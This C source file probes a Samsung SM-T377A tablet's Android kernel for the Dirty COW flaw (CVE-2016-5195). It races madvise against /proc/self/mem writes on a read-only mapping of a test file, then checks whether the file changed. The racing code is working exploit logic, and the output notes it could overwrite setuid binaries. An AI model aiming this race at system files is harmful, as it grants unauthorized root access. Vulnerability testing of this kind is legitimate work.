/*
 * dirtycow_probe.c — Quick CVE-2016-5195 detection + light exploit test
 *
 * Dirty COW: race between get_user_pages() write-protect and madvise(MADV_DONTNEED)
 * allows writing to a read-only private mmap (bypassing COW), modifying the
 * original backing file even if opened read-only.
 *
 * Kernel 3.10.9 is vulnerable (patched upstream Oct 2016, Android Nov 2016).
 * SM-T377A SPL 2017-07 SHOULD have this patched, but worth verifying.
 *
 * Test strategy (non-destructive):
 *   1. Create a test file, fill with 'A's
 *   2. Map it read-only (MAP_PRIVATE)
 *   3. Race: /proc/self/mem write vs madvise(MADV_DONTNEED)
 *   4. Check if original file was modified
 *   If yes → COW is dirty → vulnerable.
 *   If no  → patched.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <pthread.h>
#include <time.h>

#define TESTFILE "/data/local/tmp/dirtycow_test.txt"
#define FILESIZE 4096
#define RACE_ITERS 100000

static void *map;
static int stop = 0;
static volatile int wrote_it = 0;

/* Thread 1: continuously MADV_DONTNEED the mapping */
static void *madvise_thread(void *arg) {
    (void)arg;
    while (!stop) {
        madvise(map, FILESIZE, MADV_DONTNEED);
    }
    return NULL;
}

/* Thread 2: continuously write to the mapping via /proc/self/mem */
static void *write_thread(void *arg) {
    (void)arg;
    int fd = open("/proc/self/mem", O_RDWR);
    if (fd < 0) { perror("open /proc/self/mem"); return NULL; }

    char *payload = (char *)arg; /* use arg as payload pointer... wait */
    (void)payload;

    char buf[8];
    memset(buf, 'B', sizeof(buf));  /* Try to write 'B's over 'A's */

    for (int i = 0; i < RACE_ITERS && !stop; i++) {
        lseek(fd, (off_t)map, SEEK_SET);
        write(fd, buf, sizeof(buf));
    }
    close(fd);
    return NULL;
}

int main(void) {
    printf("=== Dirty COW (CVE-2016-5195) probe — SM-T377A ===\n");
    printf("[*] kernel 3.10.9, uid=%d\n", getuid());
    fflush(stdout);

    /* Create test file filled with 'A's */
    int fd = open(TESTFILE, O_RDWR | O_CREAT | O_TRUNC, 0644);
    if (fd < 0) { perror("open testfile"); return 1; }
    char fillbuf[FILESIZE];
    memset(fillbuf, 'A', FILESIZE);
    write(fd, fillbuf, FILESIZE);
    close(fd);
    printf("[*] Created test file: %s\n", TESTFILE);

    /* Open read-only */
    fd = open(TESTFILE, O_RDONLY);
    if (fd < 0) { perror("open rdonly"); return 1; }

    /* Map read-only private */
    map = mmap(NULL, FILESIZE, PROT_READ, MAP_PRIVATE, fd, 0);
    if (map == MAP_FAILED) { perror("mmap"); close(fd); return 1; }
    close(fd);

    printf("[*] mmap'd %s read-only at %p\n", TESTFILE, map);
    printf("[*] map[0]='%c' before race (should be 'A')\n", ((char*)map)[0]);
    fflush(stdout);

    /* Start race */
    pthread_t t1, t2;
    stop = 0;

    pthread_create(&t1, NULL, madvise_thread, NULL);

    /* Write thread uses local closure — start manually */
    int memfd = open("/proc/self/mem", O_RDWR);
    if (memfd < 0) { perror("open /proc/self/mem"); return 1; }

    char writebuf[8];
    memset(writebuf, 'B', sizeof(writebuf));

    struct timespec t0, t1ts;
    clock_gettime(CLOCK_MONOTONIC, &t0);

    int changed = 0;
    for (int i = 0; i < RACE_ITERS; i++) {
        lseek(memfd, (off_t)map, SEEK_SET);
        int wr = write(memfd, writebuf, sizeof(writebuf));
        (void)wr;

        /* Check if map contents changed (only valid if COW dirty) */
        if (((char*)map)[0] == 'B') {
            /* Map itself changed — but that's expected for MAP_PRIVATE after write */
            /* The REAL check is whether the original FILE changed */
        }

        if (i % 10000 == 0) {
            clock_gettime(CLOCK_MONOTONIC, &t1ts);
            long ms = (t1ts.tv_sec - t0.tv_sec) * 1000 + (t1ts.tv_nsec - t0.tv_nsec) / 1000000;
            printf("[*] %d/%d iters, %ldms elapsed\n", i, RACE_ITERS, ms);
            fflush(stdout);
        }
    }
    close(memfd);
    stop = 1;
    pthread_join(t1, NULL);

    munmap(map, FILESIZE);

    /* Check if original file was modified */
    fd = open(TESTFILE, O_RDONLY);
    char result[16] = {0};
    read(fd, result, sizeof(result) - 1);
    close(fd);

    printf("\n[*] Original file first bytes: ");
    for (int i = 0; i < 8; i++) printf("%02x('%c') ", (unsigned char)result[i], result[i]);
    printf("\n");

    if (result[0] == 'B') {
        printf("[!!!] DIRTY COW CONFIRMED! Original file was modified.\n");
        printf("[!!!] CVE-2016-5195 is PRESENT on this kernel.\n");
        printf("[!!!] Can overwrite setuid binaries or /proc/sys/vm/mmap_min_addr.\n");
        changed = 1;
    } else {
        printf("[-] Original file unchanged (still 'A'). Dirty COW appears PATCHED.\n");
        printf("[-] Or race didn't win — increase RACE_ITERS and retry.\n");
    }

    /* Clean up test file */
    unlink(TESTFILE);

    fflush(stdout);
    return changed ? 0 : 1;
}
